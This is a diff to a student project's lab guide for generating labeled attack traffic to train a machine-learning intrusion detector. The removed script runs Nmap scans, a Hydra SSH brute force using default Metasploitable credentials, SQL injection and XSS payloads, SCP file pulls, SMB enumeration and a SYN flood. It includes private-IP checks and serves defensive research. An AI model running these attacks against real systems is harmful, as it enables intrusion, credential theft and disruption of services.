@@ -1,4 +1,4 @@
-# AI Network Manager Project
+﻿# AI Network Manager Project
 
 ## Full Attack Simulation Guide
 
@@ -58,11 +58,11 @@ The recommended lab architecture uses Kali Linux as the attack machine and sever
 
 | System | Role | Example IP Address | Purpose |
 | --- | --- | --- | --- |
-| Kali Linux | Attacker | 192.168.10.10 | Runs the attack-demo.sh script and generates labeled traffic. |
-| Metasploitable | Vulnerable Linux target | 192.168.10.20 | Receives scans, SSH brute-force attempts, web payloads, and SCP transfers. |
-| Ubuntu Server | Normal service target | 192.168.10.30 | Provides normal SSH/HTTP traffic and optional service baseline. |
-| Windows Machine | Endpoint / SMB target | 192.168.10.40 | Used for SMB enumeration and Windows-style lateral movement traffic. |
-| AI Manager | Observer / ML platform | 192.168.10.50 | Captures traffic and later runs detection or ML classification. |
+| Kali Linux | Attacker | e.g. 192.168.10.10 | Runs `attack-demo.sh` and generates labeled traffic. |
+| Lab target VM | Vulnerable or service host | discovered at runtime | Receives scans, SSH, web payloads, SCP, and SMB traffic after you select it. |
+| AI Manager | Observer / ML platform | e.g. 192.168.10.50 | Captures traffic and later runs detection or ML classification. |
+
+**Note:** IP addresses in this guide are examples only. `attack-demo.sh` auto-detects your lab subnet, discovers live hosts, and asks you to choose **one** target before sending any attack traffic.
 
 # 3. Ethical and Safety Boundaries
 
@@ -79,7 +79,7 @@ Install the required tools on Kali Linux. These tools are used to generate traff
 
 ```bash
 sudo apt update
-sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional
+sudo apt install -y iproute2 nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional
 ```
 
 Optional packet-capture tools on Kali:
@@ -102,14 +102,14 @@ The script will automatically create a small demo password list and a harmless s
 
 # 6. Target Preparation Checklist
 
-Before running the attack script, verify that each target is reachable and that the intended services exist. This reduces troubleshooting during the live demonstration.
+Before running the attack script, power on your lab VMs and verify the subnet is reachable from Kali. You do **not** need to hardcode target IPs in the script â€” discovery handles that at runtime.
 
-| Target | Preparation | Verification Command from Kali |
+| Step | Preparation | Verification from Kali |
 | --- | --- | --- |
-| Metasploitable | Ensure the VM is powered on and reachable. SSH and web services should be available. | ping -c 2 192.168.10.20; nmap -sV 192.168.10.20 |
-| Ubuntu Server | Ensure SSH or web service is available if used for normal traffic. | ping -c 2 192.168.10.30; curl -I http://192.168.10.30 |
-| Windows Machine | Enable network discovery or SMB sharing only inside the lab if using SMB enumeration. | ping -c 2 192.168.10.40; smbclient -L //192.168.10.40/ -N |
-| AI Manager | Start packet capture or log collection before launching attacks. | ping -c 2 192.168.10.50 |
+| Lab targets | Power on Metasploitable, Ubuntu, or other victim VMs. | `./attack-demo.sh` (discovery lists live hosts) |
+| Services | Ensure SSH (port 22), HTTP (port 80), or SMB (port 445) exist on the host you plan to select. | `nmap -sV TARGET_IP` after choosing a target |
+| AI Manager | Start packet capture or the defense dashboard before launching attacks. | `curl http://MANAGER_IP:8080/api/health` |
+| Credentials | Have SSH username/password ready for exfiltration and lateral movement steps. | `SSH_USER=... SSH_PASS=... ./attack-demo.sh --target TARGET_IP` |
 
 # 7. Attack Classes and ML Labels
 
@@ -125,477 +125,90 @@ The attack-end script generates traffic for these ML labels. Run each class sepa
 | Lateral Movement | SMB enumeration and SSH movement | smbclient, ssh | Internal service discovery and remote login activity. |
 | DoS | Controlled SYN burst | hping3 | Short burst of SYN packets to a lab web service. |
 
+
 # 8. Full Attack Demo Script
 
-Create the script on Kali with the following command:
+The script lives in this repository at `Attack System/attack-demo.sh`. It uses **dynamic target discovery** instead of hardcoded IPs.
+
+## Key features
+
+| Feature | Function | Description |
+| --- | --- | --- |
+| Subnet detection | `detect_lab_subnet()` | Uses `ip route` and `ip -br addr` to find the active interface and CIDR |
+| Host discovery | `discover_live_hosts()` | Read-only `nmap -sn` sweep; ping fallback if needed |
+| Target selection | `select_target()` | Numbered menu — user must pick and confirm one host |
+| Validation | `validate_target_ip()` | Rejects public IPs and the local Kali address |
+| Override | `--target` / `TARGET_IP` | Skip discovery and attack a specific lab IP |
+
+All attack modules use a single `TARGET_IP` variable. SSH steps accept `SSH_USER` / `SSH_PASS` or an interactive prompt.
+
+## Run modes
+
+**Interactive discovery (default):**
 
 ```bash
-nano attack-demo.sh
+cd Attack\ System
+chmod +x attack-demo.sh
+./attack-demo.sh
 ```
 
-Paste the complete script below, then save it. Update the IP addresses at the top of the script to match your VCloud network.
-
-**Listing 1. attack-demo.sh**
+**Manual target override:**
 
 ```bash
-
-#!/bin/bash
-
-# ============================================================
-
-# AI Network Manager - Attack Traffic Generator
-
-# Lab-only attack simulation script
-
-# Author: Bernard Appiah
-
-# Purpose: Generate labeled network traffic for ML IDS training
-
-# ============================================================
-
-# -----------------------------
-
-# 0. SAFETY AND LAB BOUNDARY
-
-# -----------------------------
-
-# Use this script only inside your authorized VCloud lab.
-
-# Do not point TARGET_SUBNET or target IP variables at public IPs.
-
-# The script includes a private-IP check to reduce accidental misuse.
-
-# -----------------------------
-
-# 1. CONFIGURATION
-
-# -----------------------------
-
-TARGET_SUBNET="192.168.10.0/24"
-META_IP="192.168.10.20"
-UBUNTU_IP="192.168.10.30"
-WINDOWS_IP="192.168.10.40"
-AI_MANAGER_IP="192.168.10.50"
-
-# Metasploitable default lab account. Change if your lab uses a different account.
-META_USER="msfadmin"
-META_PASS="msfadmin"
-
-# Ubuntu lab account. Change to your actual Ubuntu test user.
-UBUNTU_USER="student"
-UBUNTU_PASS="student"
-
-WORDLIST="./wordlists/demo-passwords.txt"
-LOG_DIR="./logs"
-EXFIL_DIR="./exfil"
-EXFIL_FILE="./exfil/sample-sensitive-file.txt"
-LABEL_LOG="./logs/attack-labels.csv"
-
-mkdir -p "$LOG_DIR" "$EXFIL_DIR" "./wordlists" "./payloads"
-
-# -----------------------------
-
-# 2. HELPER FUNCTIONS
-
-# -----------------------------
-
-timestamp() {
-    date +"%Y-%m-%d_%H-%M-%S"
-}
-
-now_iso() {
-    date -Iseconds
-}
-
-banner() {
-    echo
-    echo "============================================================"
-    echo "$1"
-    echo "============================================================"
-}
-
-pause_between_attacks() {
-    echo
-    echo "[*] Waiting 10 seconds before the next action for cleaner labels..."
-    sleep 10
-}
-
-init_files() {
-    if [ ! -f "$WORDLIST" ]; then
-        cat > "$WORDLIST" << 'EOF'
-admin
-password
-123456
-msfadmin
-toor
-kali
-ubuntu
-student
-network
-security
-EOF
-    fi
-
-    if [ ! -f "$EXFIL_FILE" ]; then
-        cat > "$EXFIL_FILE" << 'EOF'
-Student Project Simulated Sensitive File
-This file is harmless and used only for controlled ML traffic labeling.
-Project: AI Network Manager
-EOF
-    fi
-
-    if [ ! -f "$LABEL_LOG" ]; then
-        echo "timestamp,class,activity,target,notes" > "$LABEL_LOG"
-    fi
-}
-
-log_label() {
-    local class="$1"
-    local activity="$2"
-    local target="$3"
-    local notes="$4"
-    echo "$(now_iso),$class,$activity,$target,$notes" >> "$LABEL_LOG"
-}
-
-is_private_ip() {
-    local ip="$1"
-    [[ "$ip" =~ ^10\. ]] && return 0
-    [[ "$ip" =~ ^192\.168\. ]] && return 0
-    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
-    return 1
-}
-
-safety_check() {
-    banner "SAFETY CHECK"
-    echo "[*] Checking target IPs..."
-
-    for ip in "$META_IP" "$UBUNTU_IP" "$WINDOWS_IP" "$AI_MANAGER_IP"; do
-        if ! is_private_ip "$ip"; then
-            echo "[!] Safety check failed: $ip is not a private RFC1918 lab IP."
-            echo "[!] Edit the script and use only your isolated VCloud lab IPs."
-            exit 1
-        fi
-    done
-
-    echo "[+] Safety check passed. All configured hosts are private lab IPs."
-}
-
-check_tools() {
-    banner "TOOL CHECK"
-    local missing=0
-    for tool in nmap hydra curl dig nslookup ssh sshpass scp smbclient hping3; do
-        if ! command -v "$tool" >/dev/null 2>&1; then
-            echo "[!] Missing tool: $tool"
-            missing=1
-        else
-            echo "[+] Found: $tool"
-        fi
-    done
-
-    if [ "$missing" -eq 1 ]; then
-        echo
-        echo "Install missing tools with:"
-        echo "sudo apt update"
-        echo "sudo apt install -y nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional"
-        exit 1
-    fi
-}
-
-# -----------------------------
-
-# 3. NORMAL TRAFFIC
-
-# -----------------------------
-
-normal_traffic() {
-    banner "CLASS: NORMAL TRAFFIC"
-    log_label "Normal" "Start normal traffic generation" "Multiple" "DNS HTTP and SSH baseline"
-
-    echo "[*] Running DNS lookups..."
-    dig example.com > "$LOG_DIR/normal_dns_dig_$(timestamp).log" 2>&1
-    nslookup example.com > "$LOG_DIR/normal_dns_nslookup_$(timestamp).log" 2>&1
-
-    echo "[*] Simulating normal web browsing to lab services..."
-    curl -I --max-time 5 "http://$META_IP" > "$LOG_DIR/normal_http_meta_$(timestamp).log" 2>&1
-    curl -I --max-time 5 "http://$UBUNTU_IP" > "$LOG_DIR/normal_http_ubuntu_$(timestamp).log" 2>&1
-
-    echo "[*] Simulating a normal SSH login to Metasploitable..."
-    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
-        "$META_USER@$META_IP" "whoami; hostname" \
-        > "$LOG_DIR/normal_ssh_meta_$(timestamp).log" 2>&1
-
-    log_label "Normal" "Completed normal traffic generation" "Multiple" "Baseline completed"
-    echo "[+] Normal traffic completed."
-}
-
-# -----------------------------
-
-# 4. RECONNAISSANCE
-
-# -----------------------------
-
-recon_scan() {
-    banner "CLASS: RECONNAISSANCE"
-    log_label "Recon" "Start ping sweep" "$TARGET_SUBNET" "Nmap host discovery"
-
-    echo "[*] Running ping sweep against lab subnet..."
-    nmap -sn "$TARGET_SUBNET" -oN "$LOG_DIR/recon_ping_sweep_$(timestamp).log"
-
-    pause_between_attacks
-
-    log_label "Recon" "Start TCP SYN scan" "$META_IP" "Nmap SYN scan"
-    echo "[*] Running TCP SYN scan against Metasploitable..."
-    sudo nmap -sS "$META_IP" -oN "$LOG_DIR/recon_syn_scan_meta_$(timestamp).log"
-
-    pause_between_attacks
-
-    log_label "Recon" "Start service version enumeration" "$META_IP" "Nmap service discovery"
-    echo "[*] Running service/version enumeration against Metasploitable..."
-    nmap -sV "$META_IP" -oN "$LOG_DIR/recon_service_enum_meta_$(timestamp).log"
-
-    log_label "Recon" "Completed reconnaissance" "$META_IP" "Recon completed"
-    echo "[+] Reconnaissance traffic completed."
-}
-
-# -----------------------------
-
-# 5. BRUTE FORCE
-
-# -----------------------------
-
-ssh_bruteforce() {
-    banner "CLASS: BRUTE FORCE"
-    log_label "Brute Force" "Start controlled SSH brute force" "$META_IP" "Hydra small wordlist"
-
-    echo "[*] Running controlled SSH brute-force attempt against Metasploitable..."
-    echo "[*] This uses a small lab wordlist to create authentication-failure traffic."
-
-    hydra -l "$META_USER" -P "$WORDLIST" "ssh://$META_IP" -t 2 -W 5 \
-        -o "$LOG_DIR/bruteforce_ssh_meta_$(timestamp).log"
-
-    log_label "Brute Force" "Completed controlled SSH brute force" "$META_IP" "Hydra completed"
-    echo "[+] SSH brute-force simulation completed."
-}
-
-# -----------------------------
-
-# 6. WEB ATTACKS
-
-# -----------------------------
-
-web_attack() {
-    banner "CLASS: WEB ATTACK"
-    log_label "Web Attack" "Start web attack payloads" "$META_IP" "SQLi and XSS test requests"
-
-    echo "[*] Sending a normal web request first..."
-    curl --max-time 5 "http://$META_IP/" \
-        -o "$LOG_DIR/web_normal_request_$(timestamp).html" 2>/dev/null
-
-    pause_between_attacks
-
-    echo "[*] Sending SQL injection-style test payload to DVWA path if available..."
-    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit" \
-        -o "$LOG_DIR/web_sqli_payload_$(timestamp).html" 2>/dev/null
-
-    pause_between_attacks
-
-    echo "[*] Sending XSS-style test payload to DVWA path if available..."
-    curl --max-time 5 "http://$META_IP/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" \
-        -o "$LOG_DIR/web_xss_payload_$(timestamp).html" 2>/dev/null
-
-    log_label "Web Attack" "Completed web payload requests" "$META_IP" "Web attack simulation completed"
-    echo "[+] Web attack simulation completed."
-}
-
-# -----------------------------
-
-# 7. EXFILTRATION SIMULATION
-
-# -----------------------------
-
-exfiltration_simulation() {
-    banner "CLASS: EXFILTRATION"
-    log_label "Exfiltration" "Start SCP transfer simulation" "$META_IP" "Harmless sample file transfer"
-
-    echo "[*] Simulating file movement using SCP."
-    echo "[*] File: $EXFIL_FILE"
-    echo "[*] This is a harmless sample file for ML traffic labeling."
-
-    # Upload mode: Kali sends a harmless sample file to the target.
-    # This still creates SCP file-transfer traffic for the ML pipeline.
-    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no "$EXFIL_FILE" \
-        "$META_USER@$META_IP:/tmp/exfil-test-$(timestamp).txt" \
-        > "$LOG_DIR/exfil_scp_upload_meta_$(timestamp).log" 2>&1
-
-    pause_between_attacks
-
-    # Pull mode: Kali pulls a harmless file from the target.
-    # This better represents exfiltration direction when the target account is authorized.
-    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no "$META_USER@$META_IP" \
-        "echo 'Harmless victim-side sample for exfil simulation' > /tmp/victim-side-sample.txt" \
-        > "$LOG_DIR/exfil_prepare_remote_file_$(timestamp).log" 2>&1
-
-    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no \
-        "$META_USER@$META_IP:/tmp/victim-side-sample.txt" \
-        "./exfil/pulled-from-target-$(timestamp).txt" \
-        > "$LOG_DIR/exfil_scp_pull_meta_$(timestamp).log" 2>&1
-
-    log_label "Exfiltration" "Completed SCP transfer simulation" "$META_IP" "SCP file movement completed"
-    echo "[+] Exfiltration simulation completed."
-}
-
-# -----------------------------
-
-# 8. LATERAL MOVEMENT SIMULATION
-
-# -----------------------------
-
-lateral_movement() {
-    banner "CLASS: LATERAL MOVEMENT"
-    log_label "Lateral Movement" "Start SMB enumeration" "$WINDOWS_IP" "SMB share discovery"
-
-    echo "[*] Simulating SMB enumeration against Windows target..."
-    smbclient -L "//$WINDOWS_IP/" -N \
-        > "$LOG_DIR/lateral_smb_enum_windows_$(timestamp).log" 2>&1
-
-    pause_between_attacks
-
-    log_label "Lateral Movement" "Start SSH internal movement simulation" "$META_IP" "SSH host-to-host style activity"
-    echo "[*] Simulating internal SSH movement to Metasploitable..."
-    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
-        "$META_USER@$META_IP" "hostname; ip addr | head" \
-        > "$LOG_DIR/lateral_ssh_meta_$(timestamp).log" 2>&1
-
-    log_label "Lateral Movement" "Completed lateral movement simulation" "Multiple" "SMB and SSH movement completed"
-    echo "[+] Lateral movement simulation completed."
-}
-
-# -----------------------------
-
-# 9. CONTROLLED DOS-LIKE TRAFFIC
-
-# -----------------------------
-
-dos_simulation() {
-    banner "CLASS: CONTROLLED DOS-LIKE TRAFFIC"
-    log_label "DoS" "Start controlled SYN burst" "$META_IP" "Low-count hping3 SYN burst"
-
-    echo "[!] This is a controlled lab-only SYN burst."
-    echo "[!] Keep this low-rate. The goal is traffic generation, not disruption."
-    echo "[!] Packet count is intentionally limited to 100."
-
-    sudo hping3 -S "$META_IP" -p 80 -c 100 --fast \
-        > "$LOG_DIR/dos_syn_burst_meta_$(timestamp).log" 2>&1
-
-    log_label "DoS" "Completed controlled SYN burst" "$META_IP" "100 SYN packets sent"
-    echo "[+] Controlled DoS-like traffic completed."
-}
-
-# -----------------------------
-
-# 10. RUN ALL
-
-# -----------------------------
-
-run_all() {
-    banner "RUNNING FULL ATTACK TRAFFIC DEMO"
-
-    normal_traffic
-    pause_between_attacks
-
-    recon_scan
-    pause_between_attacks
-
-    ssh_bruteforce
-    pause_between_attacks
-
-    web_attack
-    pause_between_attacks
-
-    exfiltration_simulation
-    pause_between_attacks
-
-    lateral_movement
-    pause_between_attacks
-
-    dos_simulation
-
-    banner "FULL DEMO COMPLETED"
-    echo "[*] Label log saved to: $LABEL_LOG"
-    echo "[*] Tool logs saved in: $LOG_DIR"
-}
-
-# -----------------------------
-
-# 11. MAIN MENU
-
-# -----------------------------
-
-init_files
-safety_check
-check_tools
-
-while true; do
-    echo
-    echo "AI Network Manager - Attack Traffic Generator"
-    echo "------------------------------------------------"
-    echo "1. Generate Normal Traffic"
-    echo "2. Reconnaissance: Nmap + Ping Sweep"
-    echo "3. Brute Force: Hydra SSH"
-    echo "4. Web Attack: SQLi + XSS"
-    echo "5. Exfiltration: SCP Transfer"
-    echo "6. Lateral Movement: SMB + SSH"
-    echo "7. Controlled DoS-like SYN Burst"
-    echo "8. Run Full Demo"
-    echo "9. Exit"
-    echo "------------------------------------------------"
-    read -p "Select option: " choice
-
-    case $choice in
-        1) normal_traffic ;;
-        2) recon_scan ;;
-        3) ssh_bruteforce ;;
-        4) web_attack ;;
-        5) exfiltration_simulation ;;
-        6) lateral_movement ;;
-        7) dos_simulation ;;
-        8) run_all ;;
-        9) echo "Exiting."; exit 0 ;;
-        *) echo "Invalid option." ;;
-    esac
-done
+./attack-demo.sh --target 192.168.10.30
+TARGET_IP=192.168.10.30 ./attack-demo.sh
+SSH_USER=student SSH_PASS=student ./attack-demo.sh --target 192.168.10.30
 ```
+
+See `Attack System/README.md` for the full option reference.
 
 # 9. How to Run the Demonstration
 
-After saving the script, make it executable and run it from the project directory.
+From the `Attack System` directory on Kali:
 
 ```bash
 chmod +x attack-demo.sh
 ./attack-demo.sh
 ```
 
+**Startup flow:**
+
+1. Tool check runs (`nmap`, `hydra`, `ip`, etc.).
+2. Lab subnet is auto-detected from your active interface.
+3. Live hosts are discovered with `nmap -sn` (no attack traffic yet).
+4. You select a target from the list and confirm it.
+5. SSH credentials are prompted (or pass `SSH_USER` / `SSH_PASS`).
+6. The attack menu opens — all traffic goes to the selected `TARGET_IP`.
+
+**Manual override** (skip discovery menu):
+
+```bash
+./attack-demo.sh --target 192.168.10.30
+```
+
 Recommended professor demonstration flow:
 
 1. Start packet capture on the AI Manager using tcpdump, Wireshark, Zeek, or another capture method.
 
-2. Run option 1: Generate Normal Traffic.
+2. Run `./attack-demo.sh`, select your lab target, and confirm.
 
-3. Wait for the class to complete and observe the label log entry.
+3. Run option 1: Generate Normal Traffic.
 
-4. Run option 2: Reconnaissance.
+4. Wait for the class to complete and observe the label log entry in `logs/attack-labels.csv`.
 
-5. Run option 3: Brute Force.
+5. Run option 2: Reconnaissance.
 
-6. Run option 4: Web Attack.
+6. Run option 3: Brute Force.
 
-7. Run option 5: Exfiltration.
+7. Run option 4: Web Attack.
 
-8. Run option 6: Lateral Movement if time allows.
+8. Run option 5: Exfiltration (requires SSH credentials).
 
-9. Run option 7: Controlled DoS only if the lab is stable and isolated.
+9. Run option 6: Lateral Movement if time allows.
 
-10. Stop packet capture and save the PCAP/log files for the ML side of the project.
+10. Run option 7: Controlled DoS only if the lab is stable and isolated.
+
+11. Stop packet capture and save the PCAP/log files for the ML side of the project.
 
 # 10. Explanation of Each Attack Class
 
@@ -661,7 +274,8 @@ dos_syn_burst.pcap
 | DVWA curl requests do not show expected page | DVWA may require login cookies or security level configuration. | Use the requests for traffic generation or manually browse DVWA/Juice Shop during capture. |
 | smbclient returns connection errors | Windows SMB may be disabled or firewall blocks SMB. | Enable SMB sharing only inside the lab or treat this class as optional. |
 | hping3 does not run | Root privileges required or tool missing. | Run sudo apt install hping3 and execute script with sudo when selecting DoS. |
-| ML labels are mixed | Multiple classes were run without pauses or separate captures. | Run one class at a time or use the attack-labels.csv timestamp log. |
+| No hosts discovered | VMs off or wrong subnet | Power on targets; try `LAB_SUBNET=192.168.10.0/24 ./attack-demo.sh` |
+| Script exits at target selection | Invalid or public IP entered | Use a private lab IP; run with `--target` after verifying with `ping` |
 
 # 13. One-Week Priority Plan
 
